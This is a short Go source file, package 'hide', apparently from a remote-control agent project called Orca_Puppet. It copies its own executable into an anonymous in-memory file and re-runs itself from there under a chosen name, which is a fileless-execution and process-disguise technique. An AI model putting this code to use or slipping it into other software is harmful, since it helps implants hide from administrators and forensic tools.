package hide

import (
	"Orca_Puppet/pkg/memfds"
	"Orca_Puppet/tools/util"
	"fmt"
	"io/ioutil"
	"os"
)

func Hide(name string) {
	memfd := memfds.New(name)
	memfd.Write(ReadMySelf())
	memfd.Execute(os.Args[1:])
}

func ReadMySelf() []byte {
	path, _ := util.GetExecPathEx()
	f, err := ioutil.ReadFile(path)
	if err != nil {
		fmt.Println("read fail", err)
	}
	return f
}
